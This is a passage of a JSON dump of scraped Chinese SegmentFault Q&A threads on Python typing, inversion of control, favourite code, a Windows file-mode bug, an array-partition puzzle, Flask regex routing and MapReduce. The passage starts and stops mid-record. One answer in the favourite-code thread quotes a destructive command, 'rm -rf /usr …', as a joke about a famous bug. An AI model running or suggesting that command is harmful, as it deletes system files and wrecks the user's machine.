      "dsc": "<div class=\"question fmt\" data-id=\"1010000000127305\">\n<p>用type()这种判断变量的方法，结果老鸟被鄙视了，不知所以然。<br/>\n求各位讲解：这个问题出在哪里，怎样判断一个变量的类型才是好方法？</p><pre>&gt;&gt;&gt; n = 911\n&gt;&gt;&gt; type(n)\n&lt;type 'int'&gt;\n&gt;&gt;&gt; type(n) is int\nTrue</pre>\n</div>",
      "favourite": "15",
      "glance": "58.7k",
      "tags": [
        "python"
      ],
      "time": "2012-10-12",
      "title": "python判断变量类型时，为什么不推荐使用type()方法",
      "url": "https://segmentfault.com/q/1010000000127305"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000757160\">\n<blockquote>\n<p>Don't call me, I will call you</p>\n</blockquote>\n<h3>正常流程</h3>\n<p>你去图书馆借书，但是没有。</p>\n<p>于是你回家了。</p>\n<p>然后你每个天去一趟图书馆，看你的书到了没有。</p>\n<p>如果还没有，那么你回家，继续等……</p>\n<p>第二天，再去看，……</p>\n<p>一直到有了这本书。</p>\n<h3>Ioc</h3>\n<p>你去图书馆借书，但是没有。</p>\n<p>于是你<strong>登记了一下</strong>，就回家了。</p>\n<p>回到家，刷刷微博，刷刷sf，撸撸代码。</p>\n<p>等书到了，管理员通知你。</p>\n<p>你去拿书。</p>\n<hr>\n<blockquote>\n<p>Don't call me, I will call you</p>\n</blockquote>\n</hr></div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000756914\">\n<p>IoC就是让框架为我们创建些东西。</p>\n<pre><code>App::bind('sms', function () {\n   // Create a new SMS component.\n   $sms = new SMSClient;\n   $sms-&gt;setUsername('shauna');\n   $sms-&gt;setPassword('1_5t341_c4t5!');\n   // Return the created SMS component.\n   return $sms;\n});\n</code></pre>\n<p>据Clouser function特征,上面代的代码不会创建$sms对象。<br>\n$app-&gt;make('sms')的时候，$sms对象才被创建。所谓的反转大概就是按需创建吧。用的时候才触发创建，不是创建好了等着用。</br></p>\n<p>因为程序员本身是农民工的一种，但是又想装的高大上一些，用以自赏，所以创建了这个很NB的术语，装的好像搞原子弹的。不用太在意。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000757198\">\n<p>我试着搜了一下，中文资料基本都把IoC（控制翻转）和DI（依赖注入）混为一谈，就连<a href=\"http://stackoverflow.com/questions/3058/what-is-inversion-of-control\" rel=\"nofollow\">StackOverflow上的第一位答案</a>也犯了同样的问题（幸好下面有高票的反对评论，否则我的世界观都快坏掉了）</p>\n<p>控制翻转是代码复用的一种模式（注意不是设计模式）</p>\n<p>一般（非IoC）的复用，通常是用户代码调用组件（任意形式的被复用的代码，本答案中统称为组件）。也就是用户代码解决“Why it works, What to do”，组件解决“How to do”，逻辑的入口是用户代码，</p>\n<p>而控制翻转则是组件来调用用户代码，也就是组件解决“Why it works, When to do”，用户代码解决“What to do”，逻辑的入口是组件</p>\n<p>下面是除了DI之外的控制翻转的例子</p>\n<ul>\n<li>接口／虚函数  组件调用接口／虚函数，具体由用户代码实现</li>\n<li>发布订阅（事件）模式  组件触发事件，用户代码订阅事件</li>\n<li>回调  用户代码写回调，组件来调用</li>\n<li>\n<strong>几乎所有能被称之为框架的东西</strong>  用户代码在规定的地方实现具体业务逻辑，剩下的框架负责</li>\n</ul>\n</div>",
      "attention": "24",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000755828\">\n<p>RT，如何理解IoC（Inversion of Control）？如果能写个demo解释最好了。</p>\n</div>",
      "favourite": "19",
      "glance": "3.4k",
      "tags": [
        "php",
        "python",
        "java",
        "ruby"
      ],
      "time": "2014-11-03",
      "title": "如何理解IoC（Inversion of Control）？",
      "url": "https://segmentfault.com/q/1010000000755828"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000319690\">\n<p><a href=\"http://segmentfault.com/q/1010000000318477\" rel=\"nofollow\">滚动的地球仪</a></p>\n<p><a href=\"http://jsfiddle.net/justjavac/KbetG/\" rel=\"nofollow\">http://jsfiddle.net/justjavac/KbetG/</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000097250\">\n<pre>#include&lt;stdio.h&gt;\nint main()\n{\n   printf(\"hello world\\n\");\n   return 0;\n}</pre>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000097243\">\n<p>最神奇的代码莫过于 Quake III 中不可思议的求解平方根实现方法，尤其是神奇的常量<code>0x5f3759df</code><pre>float Q_rsqrt( float number )\n{\n    long i;\n    float x2, y;\n    const float threehalfs = 1.5F;\n\n    x2 = number * 0.5F;\n    y  = number;\n    i  = * ( long * ) &amp;y;  // evil floating point bit level hacking\n    i  = 0x5f3759df - ( i &gt;&gt; 1 ); // what the fuck?\n    y  = * ( float * ) &amp;i;\n    y  = y * ( threehalfs - ( x2 * y * y ) ); // 1st iteration\n    // y  = y * ( threehalfs - ( x2 * y * y ) ); // 2nd iteration, this can be removed\n\n    #ifndef Q3_VM\n    #ifdef __linux__\n        assert( !isnan(y) ); // bk010122 - FPE?\n    #endif\n    #endif\n    return y;\n}</pre><p>还有这句比较好玩的：</p><pre>rm -rf /usr /lib/nvidia-current/xorg/xorg</pre><p>源自 <a href=\"https://github.com/MrMEEE/bumblebee/commit/a047be85247755cdbe0acce6#diff-1\" rel=\"nofollow\" target=\"_blank\" title=\"https://github.com/MrMEEE/bumblebee/c...\">https://github.com/MrMEEE/bumblebee/c...</a></p>\n</p></div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000095034\">\n<pre>import re, collections\ndef words(text): return re.findall('[a-z]+', text.lower()) \ndef train(features):\n    model = collections.defaultdict(lambda: 1)\n    for f in features:\n        model[f] += 1\n    return model\nNWORDS = train(words(file('big.txt').read()))\nalphabet = 'abcdefghijklmnopqrstuvwxyz'\ndef edits1(word):\n   splits     = [(word[:i], word[i:]) for i in range(len(word) + 1)]\n   deletes    = [a + b[1:] for a, b in splits if b]\n   transposes = [a + b[1] + b[0] + b[2:] for a, b in splits if len(b)&gt;1]\n   replaces   = [a + c + b[1:] for a, b in splits for c in alphabet if b]\n   inserts    = [a + c + b     for a, b in splits for c in alphabet]\n   return set(deletes + transposes + replaces + inserts)\ndef known_edits2(word):\n    return set(e2 for e1 in edits1(word) for e2 in edits1(e1) if e2 in NWORDS)\ndef known(words): return set(w for w in words if w in NWORDS)\ndef correct(word):\n    candidates = known([word]) or known(edits1(word)) or known_edits2(word) or [word]\n    return max(candidates, key=NWORDS.get)\n;</pre><p>Peter Norvig的Spelling Corrector</p>\n</div>",
      "favourite": "14",
      "glance": "6.2k",
      "tags": [
        "code",
        "python",
        "ruby",
        "lisp",
        "java-ee"
      ],
      "time": "2011-10-21",
      "title": "请问您所见过的最棒的一段代码是什么？",
      "url": "https://segmentfault.com/q/1010000000095034"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "0",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000390361\">\n<p>翻译这篇文档<a href=\"http://www.dabeaz.com/ply/ply.html\" rel=\"nofollow\">Python Lex Yacc</a><br>\n已经完成75%，需要继续翻译和校验，纯粹兴趣，没有报酬</br></p>\n</div>",
      "favourite": "2",
      "glance": "2.3k",
      "tags": [
        "python"
      ],
      "time": "2014-01-17",
      "title": "【Python】有没有人有兴趣一起翻译",
      "url": "https://segmentfault.com/q/1010000000390361"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000398099\">\n<p>请特别阅读 @依云 的答案。分析上游代码和文档，这才是真正坚不可摧的力量。</p>\n<ul>\n<li>看似跨平台但本质动作仍然平台有关的操作，真的千万少用。Python的跨平台特性，遇到了情况也惯坏人……</li>\n<li>在磁盘上跳来跳去真不安全，还是整批进整批出的把握。</li>\n<li>大量随机读写查询的需求，好好调动个高层的工具（数据库等）。</li>\n</ul>\n<hr>\n<p>同仁们，误入歧途了啊！！！别在ASCII的文件上这么深入的追究编码问题啊！！！</p>\n<p>我试了一下，果然爽翻：</p>\n<pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nf = open(r\"C:\\Users\\776\\test.txt\",\"w+\") \n# 注：w+ truncates the file - 因此文件无论存在与否，结果一致\nf.write('hello')\nprint(f.read())\nf.close()\n# 结果不贴了，同样不忍直视，传送门：http://paste.openstack.org/show/61806/\n</code></pre>\n<p>我没有深入的究其原因，不过大概能猜到理由是什么：<strong>文件的指针位置</strong>。</p>\n<p><code>open()</code>以w+模式开启了一个读写模式的文件，由于是w，所以文件被废弃清空（truncate），此时的文件内容为<code>[EOF]</code>，开启时的指针为0。此时如果做<code>read()</code>，则Python发现指针位置就是EOF，读取到空字符串。</p>\n<p>在写入hello之后，指针的位置是5，文件在内存中是<code>hello[EOF]</code>。</p>\n<p>但看起来read()的时候，Python仍然去试图在磁盘的文件上，将指针从文件头向后跳5，再去读取到EOF为止。</p>\n<p>也就是说，你实际上是跳过了该文件真正的EOF，为硬盘底层的数据做了一个dump，一直dump到了一个从前文件的<code>[EOF]</code>为止。所以最后得到了一些根本不期待的随机乱字符（这里根本不是编码问题造成的乱码！）。</p>\n<p>(看起来似乎还暴露了一些以前文件的内容呢，<code>C:\\Anaconda\\</code>神马的 :D)</p>\n<p>解决这个问题，你需要在读文件之前，用file对象的<code>flush()</code>方法，将已修改的文件内容可靠写盘：</p>\n<pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nf = open(r\"C:\\Users\\776\\test.txt\",\"w+\") \n# 注：w+ truncates the file - 因此文件无论存在与否，结果一致\nf.write('hello') # 此时指针=5，内存内容=`hello[EOF]`\nf.flush() # 此时硬盘内容=`hello[EOF]`\nprint(f.read()) # 此时指针=5，正好在[EOF]上，正确输出''\nf.seek(0) # 指针归0\nprint(f.read()) # 正确从头读出全部内容'hello'\nf.close()\n</code></pre>\n<p>这并不是完美的解决方法，因为我总觉得<code>flush()</code>应该是真正决定写盘之前才做的，而不是<code>read()</code>一次就<code>flush()</code>一次。<code>read()</code>似乎还是优先读取内存缓冲区更有道理。</p>\n<p>但总之至少猜测到了一个原因，并一定程度解决问题，更好的方法有待补充吧？</p>\n</hr></div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000397775\">\n<p>Windows下的编码是个大坑，别用记事本了，换nodepad++吧。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000398124\">\n<p>更新：</p>\n<p>我在路上就在想，这么底层的一个特性，为什么 Python 没有为程序员处理掉呢？都用 Python 了，谁会为了那么大的便利牺牲一丁点性能呢？一回来我就做了测试。</p>\n<p>经测试，Python 2.7.5 on Windows XP 重现此情况，Python 3.3.2 on Windows XP 没有重现。<strong>这说明 Python 2 确实该换了！</strong></p>\n<p>再次更新：</p>\n<p>找到原因之后我就觉得这问题在哪里见过，今天终于找出来了， python-cn 邮件列表里<a href=\"https://groups.google.com/forum/#!topic/python-cn/YizaUQGPQuo\" rel=\"nofollow\">讨论过的</a>。</p>\n<hr>\n<p>真正的答案来啦～～我在 MSDN 里找得好苦哦 QAQ</p>\n<p>真正的原因不在于 Python 怎么样了，而在于 <strong>Windows 怎么样了</strong>。经查源码（Python 2.7.6）<code>Objects/fileobject.c:2837</code>，Python 是使用 <code>fopen/fread/fwrite</code> 这系列函数来读写文件的。<a href=\"http://msdn.microsoft.com/en-us/library/yeby3zcb.aspx\" rel=\"nofollow\">MSDN 说</a>：</p>\n<blockquote>\n<p>When the \"r+\", \"w+\", or \"a+\" access type is specified, both reading and writing are allowed (the file is said to be open for \"update\"). However, when you switch from reading to writing, the input operation must encounter an EOF marker. If there is no EOF, you must use an intervening call to a file positioning function. The file positioning functions are fsetpos, fseek, and rewind. When you <strong>switch from writing to reading</strong>, you <strong>must</strong> use an intervening call to either <strong>fflush</strong> or to a file positioning function.</p>\n</blockquote>\n<p>所以会有 <a href=\"http://segmentfault.com/u/shamiao\">@沙渺</a> 发现添加 <code>flush()</code> 调用后正确的结果。</p>\n<p>Linux 下没有重现。<code>man 3 fopen</code> 说：</p>\n<blockquote>\n<p>Reads and writes may be intermixed on read/write streams in any order. Note that <strong>ANSI C requires that a file positioning function intervene between output and input</strong>, unless an input operation encounters end-of-file. (If this condition is not met, then a read is allowed to return the result of writes other than the most recent.) Therefore it is good practice (and indeed <strong>sometimes necessary under Linux</strong>) to put an fseek(3) or fgetpos(3) operation between write and read operations on such a stream. This operation may be an apparent no-op (as in fseek(..., 0L, SEEK_CUR) called for its synchronizing side effect.</p>\n</blockquote>\n<p>所以 Windows 的这种行为是符合 ANSI C 标准的，但是 Linux 并不（总是）需要这样做。（并且，跨平台的方案是使用文件定位函数而不是 <code>fflush()</code>。）</p>\n</hr></div>",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000397712\">\n<html><body>\n<p>windows7 +2.7.5<br>\n我的源代码：</br></p>\n<pre><code>#!/usr/bin/env python\n# -*- coding: utf-8 -*-\nfile = open(r\"D:\\Android\\python\\test.txt\",\"w+\")\nfile.write('hello')\nfile.read()\n</code></pre>\n<p>python test1.py后，用记事本打开文件显示乱码，请问这是怎么回事啊？</p>\n<p><img data-src=\"http://segmentfault.com/img/bVbPEj\"/></p>\n</body></html>\n</div>",
      "favourite": "8",
      "glance": "10.9k",
      "tags": [
        "python"
      ],
      "time": "2014-01-24",
      "title": "python写文件打开后是乱码",
      "url": "https://segmentfault.com/q/1010000000397712"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000005746733\">\n<p>用链表还是很容易的吧，只是改变指针就可以了，遍历一次搞定，遇到偶数插入队尾（只改指针不申请内存），奇数就不管它，但如果还要对奇偶数各自排序基本不会有O(n)的算法</p>\n<pre><code>L = [1, 2, 3, 4, 5, 6]\nindex = 0\nfor _ in range(len(L)):\n    if L[index] % 2 == 1:\n        index += 1\n    else:\n        L.append(L.pop(index))\nprint(L)</code></pre>\n<pre><code>#include &lt;iostream&gt;\n#include &lt;list&gt; \n\nusing namespace std;\n\nint main() {\n    list&lt;int&gt; L;\n    int n = 3; \n    // 初始化链表\n    for(int i = 1; i &lt;= n * 2; i++)\n        L.push_back(i);\n    // 划分奇偶数\n    for(list&lt;int&gt;::iterator it = L.begin(); 0 &lt; n; ++it){\n        if(*it % 2 == 0){  // 如果是偶数\n            L.push_back(*it); // 插入尾节点 O(1)\n            L.erase(it); // 删除节点 O(1)\n            n -= 1;\n        }      \n    }\n    // 打印链表\n    for(list&lt;int&gt;::iterator it = L.begin(); it != L.end(); ++it)\n        cout &lt;&lt; *it &lt;&lt; ' ';\n    cout &lt;&lt; endl;\n        \n    return 0;\n}</code></pre>\n<p>已经很多人说了， 用链表是很容易实现的，但是用数组却不行（保持稳定性，时间O(n)，空间O(1)），如果谁可以，show your code，让我们膜拜你。</p>\n<p>初看无解的问题，貌似也有解决的办法的，待我整理一下。</p>\n<pre><code>def Foo(L):\n    # L = [0, 2, 4, 1, 3, 5]\n    length = len(L)\n    sk = max(*L, length) + 1# secret key\n    # 32位的话最多是支持4万多的数据量，且最大值也不超过46340\n    assert sk &lt; 46340, 'sk must be less than 46340' \n    li = 0                  # left index\n    ri = length - 1         # right index\n    uli = li                # unsorted left index\n    uri = ri                # unsorted right index\n    lli = length // 2 - 1   # left last index\n    rfi = lli + 1           # right first index\n    # 第一个循环先区别就位和未能就位的元素，同时将index信息加密到未能就位的元素数据中\n    # 这里用的加密文法是number = -(num + sk * indnx),将其变成一个负值\n    # 解密可以用index, num = divmod(abs(number), sk)来解密\n    while li &lt;= ri:\n        # 左边扫描到奇数\n        if L[li] % 2 == 1:\n            L[li], L[uli] = L[uli], L[li]\n            li += 1\n            uli += 1\n        # 右边扫描到偶数\n        elif L[ri] % 2 == 0:\n            L[ri], L[uri] = L[uri], L[ri]\n            ri -= 1\n            uri -= 1\n        # 当左为偶，且右为奇\n        else:\n            L[li], L[ri] = L[ri], L[li]\n            L[li] = -(L[li] + sk * lli) # 加密乱序的元素\n            lli -= 1\n            L[ri] = -(L[ri] + sk * rfi) # 加密乱序的元素\n            rfi += 1\n            li += 1\n            ri -= 1\n    print(L) # 加密后 [-39, -20, -1, -89, -70, -51]\n    # 解密\n    for i in range(uli, uri):\n        if L[i] &lt; 0:\n            index, number = divmod(abs(L[i]), sk)\n            next_num = L[index]\n            while next_num &lt; 0:                \n                L[index] = number\n                index, number = divmod(abs(next_num), sk)\n                next_num = L[index]\n    print(L) # 解密 [1, 3, 5, 0, 2, 4]\n    return L</code></pre>\n<p><strong>最好不要用大于length数字来测试</strong>，如果数据不大的话，应该没问题的，否则就要考虑溢出的问题了。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000005745919\">\n<p>我是這樣想拉，不知道你覺得怎麼樣:</p>\n<p>就從數組的頭開始走，碰到奇數不動，碰到偶數就把它放到數組的最後，直到搬動了 n 個偶數為止。</p>\n<pre><code>1. 奇數偶數各自順序不變\n2. 只需要一個整數記目前搬動幾個了\n3. 就最差 2n 步(偶數都在後面的情況)</code></pre>\n<hr>\n<p>P.S. 為什麼給負分呢? 如果覺得答案有任何不妥的地方，可以先評論、討論之後再給別人負分，我不覺得有必要踩在這裡認真討論的人，對於負分充滿著疑惑...</p>\n</hr></div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000005746481\">\n<p>在你的3个条件限制下，数组不行，链表可以。</p>\n</div>",
      "attention": "28",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000005744068\">\n<p>给定一个2n长数组，其中n个奇数和n个偶数，对数组进行排序将奇数放在前半部分，偶数放在后半部分。要求：</p>\n<ol>\n<li><p>不改变原来的奇偶各自的相对顺序</p></li>\n<li><p>只申请常数的空间</p></li>\n<li><p>时间复杂度为O(n)</p></li>\n</ol>\n<p>举例：给出1 2 3 4 5 6<br>排序后为 1 3 5 2 4 6</br></p>\n<p>PS：请一定仔细阅读3个条件，去掉其中任意一个都变得简单，并且网上我搜到的答案都是缺少其中某个条件的。因此我怀疑这题是否有解。</p>\n<hr>\n<p>看了大家的回答，基本可以分为2种情况：</p>\n<ol>\n<li><p>用链表可以轻易解决这道题，当然如果把数组转成链表因为需要申请2n长度的next数组，所以认为还是申请额外空间了</p></li>\n<li><p>只管输出，如果只要求输出结果那遍历2遍就行了，但这样题目变得太过简单</p></li>\n</ol>\n<p>因为这是一道面试题，我想可以从上面2方面和面试官沟通，我只是凭记忆写下这题，其中也许有自己的一些思维定势（比如没有强调一定是数组，或者没有强调必须要求数组排序只要求输出）。看了大家的讨论还是很有启发的。</p>\n<hr>\n<p>找到了国外的链接，看了一圈讨论大部分认为没有O(n)时间O(1)空间的解法<br><a href=\"https://www.careercup.com/question?id=5201559730257920\">https://www.careercup.com/question?id=5201559730257920</a></br></p>\n<hr>\n<p>另外说下我自己对这题的一个思考，可以观察到，假如一个数组是符合最终条件的，那么发现当且仅当只交换相邻的两个奇偶数是不会破坏相对顺序的，那么只需给出一个策略找出从最终状态转到题目起始状态的就行了。<br>另外，不要纠结于奇偶分别的大小问题，比如4 5 3 1 2 6和2 1 3 5 4 6是等价的，只是一个简单的替换，只要将奇数按1 3 5……这样的顺序，偶数按2 4 6……这样的顺序排好就行了。</br></p>\n</hr></hr></hr></div>",
      "favourite": "7",
      "glance": "1.4k",
      "tags": [
        "c++",
        "c",
        "python",
        "算法"
      ],
      "time": "6-17",
      "title": "给定一个2n长的数组将奇数放在偶数前面",
      "url": "https://segmentfault.com/q/1010000005744068"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000125690\">\n<p>赞同 @cute 的答案，再进一步：self.regex到底是什么？</p><p>Flask（其实是Werkzeug）使用Converter把URL中特殊部分（&lt;regex(\"[a-zA-Z0-9]+\"):uuid&gt;）转换为Python变量，通用格式是&lt;converter(args):var_name&gt;。在这个例子中，一个叫regex的converter把URL中相应字段转换为view()中的uuid变量。</p><p>因此，converter的regex就是用来判断这串字符是否符合转换格式，ok就转换，否则跳过。对于IntegerConverter来说，\"abc\"显然无能为力。也就是说，其实Werkzeug的路由本来就支持用正则表达式。string、int、float等都是从它派生出来的（可以看看IntegerConverter等built-in Converter的regex）。</p><p>至于为什么不显式地支持，我猜可能是因为正则表达式不容易写好，buggy。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004478697\">\n<p>插一句，flask也可以集中到一起。</p>\n<p>python的装饰器其实就是返回函数的函数，外层函数的参数就是装饰器的参数，内层函数的参数是被装饰的函数。所以直接调用<code>app.route</code>应该会返回一个函数，直接把req handler传进去就可以注册它。</p>\n<p>于是，你可以这样写：</p>\n<pre><code>app.route(pattern)(handler)</code></pre>\n<p>就能集中到一起了。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000125309\">\n<p>通过运行如下代码：</p><pre>from flask import Flask\nfrom pprint import pprint\n\nif __name__ == '__main__':\n    app = Flask(__name__)\n    pprint(app.url_map.converters)</pre><p>可以获取Flask默认支持的转换器：</p><pre>{'any': &lt;class 'werkzeug.routing.AnyConverter'&gt;,\n 'default': &lt;class 'werkzeug.routing.UnicodeConverter'&gt;,\n 'float': &lt;class 'werkzeug.routing.FloatConverter'&gt;,\n 'int': &lt;class 'werkzeug.routing.IntegerConverter'&gt;,\n 'path': &lt;class 'werkzeug.routing.PathConverter'&gt;,\n 'string': &lt;class 'werkzeug.routing.UnicodeConverter'&gt;}</pre><p>那如何创建一个新的路由解析转化器呢？<br/>\n在Flask的app.py里有个简单的例子,这个例子是创建了一个list类型的路由转换器：</p><pre>from werkzeug.routing import BaseConverter           \n                                                     \nclass ListConverter(BaseConverter):                  \n    def to_python(self, value):                      \n        return value.split(',')                      \n    def to_url(self, values):                        \n        return ','.join(BaseConverter.to_url(value)  \n                        for value in values)         \n                                                     \napp = Flask(__name__)                                \napp.url_map.converters['list'] = ListConverter</pre><p>那么我们可以容易创建一个正则解析器，因为之前的转换器最终也是转换成正则的，只需要将获取的值设置为regex属性就可以使用了：</p><pre>from flask import Flask\nfrom werkzeug.routing import BaseConverter\nclass RegexConverter(BaseConverter):\n    def __init__(self, map, *args):\n        self.map = map\n        self.regex = args[0]\n\napp = Flask(__name__)\napp.url_map.converters['regex'] = RegexConverter\n\n@app.route('/view/&lt;regex(\"[a-zA-Z0-9]+\"):uuid&gt;/')\ndef view(uuid):\n    \"\"\"\n    url: /view/1010000000125259/\n    result: view uuid:1010000000125259\n    \"\"\"\n    return \"view uuid: %s\" % (uuid)\n\n@app.route('/&lt;regex(\".*\"):url&gt;')\ndef not_found(url):\n    \"\"\"\n    url: /hello\n    result: not found: 'hello'\n    \"\"\"\n    return \"not found: '%s'\" % (url)\n\nif __name__ == '__main__':\n    app.run()</pre>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000000125259\">\n<p>flask跟web.py差别挺大的，尤其是在路由管理这块。web.py把所有的路由都集中在一起，我比较喜欢这种方式。最近用flask，发现<code>@app.route('&lt;URL&gt;')</code>中URL只支持string、int、float、path 4种类型，并不支持正则。</p><p>但我觉得flask绝对没有这么低级，肯定有支持的方法，所以来向各路长老求个方子</p>\n</div>",
      "favourite": "18",
      "glance": "7k",
      "tags": [
        "python",
        "flask"
      ],
      "time": "2012-10-08",
      "title": "让Flask的路由URL支持正则",
      "url": "https://segmentfault.com/q/1010000000125259"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000000149037\">\n<p>你的问题问得太大了，应该自己再做更进一步的学习，重点问你反复学习怎么也不懂的部分。</p><p>基本赞同楼上felix021的答案，有几点补充：</p><ul><li>MapReduce是一种数据处理思想，最早由Google的Jeff Dean等人发明，论文公开后，由Yahoo!的Doug Cutting实现了开源版本的MapReduce实现，发展为后来的Hadoop</li><li>Hadoop包含一个开源的MapReduce计算框架，和一个分布式文件系统：HDFS</li><li>MapReduce的精髓是并行处理、移动程序比移动数据更划算</li><li>你如果只是做一些简单的统计（如SQL中的count, group by, order by, avg, max, min等），Hive会更适合你，当你把500G都导入hive后，就可以直接在hive的命令行输入SQL（严格的讲，它不是SQL，但真的跟SQL很像很像）来执行你要的查询了</li><li>Hive和Pig都是基于Hadoop的数据分析工具，它们都依赖Hadoop，但Hadoop不一定用来做数据分析和统计，比如Google拿它来做Index Building</li><li>单从性能的角度来讲，你只有一台机器的话，用MapReduce是没有多大意义的，再并发你也只有一台机器啊。但我还是推荐你用Hadoop + Hive，至少你不用操心怎么切割读入这500G数据，不用关心处理到250G的时候失败了怎么办</li></ul><ins><em>参考教程 </em></ins><p>单机安装Hadoop Hive 的十五分钟教程：（我写的）<a href=\"http://rdc.taobao.com/team/top/2011/03/16/single_node_hadoop_and_hive_in_15_mins/\" rel=\"nofollow\" target=\"_blank\" title=\"http://rdc.taobao.com/team/top/2011/0...\">http://rdc.taobao.com/team/top/2011/0...</a></p><p>用PHP来写MapReduce程序（For Hadoop）：（还是我写的）<a href=\"http://rdc.taobao.com/team/top/2011/03/28/hadoop_mapreduce_with_php/\" rel=\"nofollow\" target=\"_blank\" title=\"http://rdc.taobao.com/team/top/2011/0...\">http://rdc.taobao.com/team/top/2011/0...</a></p><p>经典的Word Count示例程序：（Hadoop官网的）<a href=\"http://wiki.apache.org/hadoop/WordCount\" rel=\"nofollow\" target=\"_blank\" title=\"http://wiki.apache.org/hadoop/WordCou...\">http://wiki.apache.org/hadoop/WordCou...</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000000148978\">\n<p>比如说要查日志中不同单词出现的次数，把日志平均（注意这个评价不止是说大小，还有概率）分成两份（map），然后由两台机器分别去统计，A机器查到的结果是 {\"hello\": 3, \"world\": 5}， B机器查到的结果是 {\"world\": 4, \"program\": 2} 。两个一合并（reduce），就得到最终结果 {\"hello\": 3， “world\": 9, \"program\": 2}</p><p>这样一个简单的例子你可以看到，一个map-reduce的过程，就是将一个任务平均划分（通常用上hash以保证平均）成多个互不依赖的子任务分别处理（map），然后再将子任务的结果合并（reduce）的过程。</p><p>并不是所有的任务都可以用map-reduce模型来完成的，但是Google通过对模型的简化，使得这样一套系统实际上也能完成相当多的实际任务。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000000149523\">\n<p><strong>印度Java程序员Shekhar Gulati在自己的博客发表了“How I explained MapReduce to my Wife?”一文，比较通俗地阐述了MapReduce的概念。</strong></p><p>昨天，我在Xebia印度办公室发表了一个关于MapReduce的演说。演说进行得很顺利，听众们都能够理解MapReduce的概念（根据他们的反馈）。我成功地向技术听众们（主要是Java程序员，一些Flex程序员和少数的测试员）解释了MapReduce的概念，这让我感到兴奋。在所有辛勤的工作之后，我们在Xebia印度办公室享用了丰盛的晚餐，然后我径直回了家。</p><p>回家后，我的妻子（Supriya）问道：“你的会开得怎么样？”我说还不错。接着她又问我会议是的内容是什么(她不是从事软件或编程领域的工作的)。我告诉她说MapReduce。“Mapduce，那是什么玩意儿？”她问道： “跟地形图有关吗？”我说不，不是的，它和地形图一点关系也没有。“那么，它到底是什么玩意儿？”妻子问道。 “唔…让我们去Dominos(披萨连锁)吧，我会在餐桌上跟你好好解释。” 妻子说：“好的。” 然后我们就去了披萨店。</p><p>我们在Domions点餐之后，柜台的小伙子告诉我们说披萨需要15分钟才能准备好。于是，我问妻子：“你真的想要弄懂什么是MapReduce？” 她很坚定的回答说“是的”。 因此我问道：</p><p>我： 你是如何准备洋葱辣椒酱的？（以下并非准确食谱，请勿在家尝试）</p><p>妻子： 我会取一个洋葱，把它切碎，然后拌入盐和水，最后放进混合研磨机里研磨。这样就能得到洋葱辣椒酱了。</p><p>妻子： 但这和MapReduce有什么关系？</p><p>我： 你等一下。让我来编一个完整的情节，这样你肯定可以在15分钟内弄懂MapReduce.</p><p>妻子： 好吧。</p><p>我：现在，假设你想用薄荷、洋葱、番茄、辣椒、大蒜弄一瓶混合辣椒酱。你会怎么做呢？</p><p>妻子： 我会取薄荷叶一撮，洋葱一个，番茄一个，辣椒一根，大蒜一根，切碎后加入适量的盐和水，再放入混合研磨机里研磨，这样你就可以得到一瓶混合辣椒酱了。</p><p>我： 没错，让我们把MapReduce的概念应用到食谱上。Map和Reduce其实是两种操作，我来给你详细讲解下。</p><p>Map（映射）: 把洋葱、番茄、辣椒和大蒜切碎，是各自作用在这些物体上的一个Map操作。所以你给Map一个洋葱，Map就会把洋葱切碎。 同样的，你把辣椒，大蒜和番茄一一地拿给Map，你也会得到各种碎块。 所以，当你在切像洋葱这样的蔬菜时，你执行就是一个Map操作。 Map操作适用于每一种蔬菜，它会相应地生产出一种或多种碎块，在我们的例子中生产的是蔬菜块。在Map操作中可能会出现有个洋葱坏掉了的情况，你只要把坏洋葱丢了就行了。所以，如果出现坏洋葱了，Map操作就会过滤掉坏洋葱而不会生产出任何的坏洋葱块。</p><p>Reduce（化简）:在这一阶段，你将各种蔬菜碎都放入研磨机里进行研磨，你就可以得到一瓶辣椒酱了。这意味要制成一瓶辣椒酱，你得研磨所有的原料。因此，研磨机通常将map操作的蔬菜碎聚集在了一起。</p><p>妻子： 所以，这就是MapReduce?</p><p>我： 你可以说是，也可以说不是。 其实这只是MapReduce的一部分，MapReduce的强大在于分布式计算。</p><p>妻子： 分布式计算？ 那是什么？请给我解释下吧。</p><p>我： 没问题。</p><p>我： 假设你参加了一个辣椒酱比赛并且你的食谱赢得了最佳辣椒酱奖。得奖之后，辣椒酱食谱大受欢迎，于是你想要开始出售自制品牌的辣椒酱。假设你每天需要生产10000瓶辣椒酱，你会怎么办呢？</p><p>妻子： 我会找一个能为我大量提供原料的供应商。</p><p>我：是的..就是那样的。那你能否独自完成制作呢？也就是说，独自将原料都切碎？ 